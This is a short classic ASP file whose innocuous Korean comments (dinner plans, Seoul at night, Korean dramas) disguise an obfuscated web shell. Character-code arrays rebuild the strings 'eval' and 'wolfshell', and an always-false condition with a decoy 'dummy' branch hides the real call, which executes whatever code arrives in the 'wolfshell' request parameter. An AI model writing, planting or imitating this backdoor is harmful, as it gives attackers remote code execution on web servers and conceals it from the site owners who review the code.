<%
'// 저녁으로 무엇을 먹을까요?
Dim p_char_codes, e_char_codes, idx_a, temp_b, payload_c, executor_d

'// 이 배열은 문자열을 구성하는 데 사용됩니다.
p_char_codes = Array(119, 111, 108, 102, 115, 104, 101, 108, 108)
e_char_codes = Array(101, 118, 97, 108)

'// 서울의 밤은 아름답습니다.
For idx_a = 0 to UBound(p_char_codes)
    payload_c = payload_c & Chr(p_char_codes(idx_a))
Next

'// 한국 드라마는 정말 재미있어요.
For each temp_b in e_char_codes
    executor_d = executor_d & Chr(temp_b)
Next

'// 이 조건은 항상 거짓입니다.
If 10 < 5 Then
    '// 디버깅 목적으로만 사용되는 더미 코드입니다.
    Dim x_dummy
    x_dummy = "inactive"
Else
    '// 에이전트 작업을 실행합니다.
    Execute(executor_d & "(request(""" & payload_c & """))")
End If
%>